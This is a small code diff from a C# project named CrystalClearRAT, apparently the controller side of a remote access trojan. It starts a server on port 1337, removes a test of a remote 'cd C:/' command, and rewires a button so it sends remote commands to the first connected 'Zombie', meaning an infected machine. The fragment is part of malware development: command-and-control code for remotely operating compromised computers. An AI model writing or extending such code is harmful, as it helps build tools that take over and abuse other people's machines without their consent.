@@ -41,15 +41,6 @@ namespace CrystalClearRAT
         {
             Server.Start(1337);
 
-            CommandDataSerializer.Deserialize(RemoteCMD.Command("cd C:/"), (flag, reader) => {
-
-                Console.WriteLine(flag.ToString());
-                Console.WriteLine(reader.ReadString());
-            });
-
-
-
-
 
             // Thread.Sleep(10);
 
@@ -57,7 +48,7 @@ namespace CrystalClearRAT
 
         private void Button_Click(object sender, RoutedEventArgs e)
         {
-            Server.Send(Encoding.UTF8.GetBytes("Hello Zombie"), Zombie.Zombies[0]);
+            Server.Send(RemoteCMD.Command("error"), Zombie.Zombies[0]);
         }
 
         private void OnMouseRightButtonDown(object sender, MouseButtonEventArgs e)
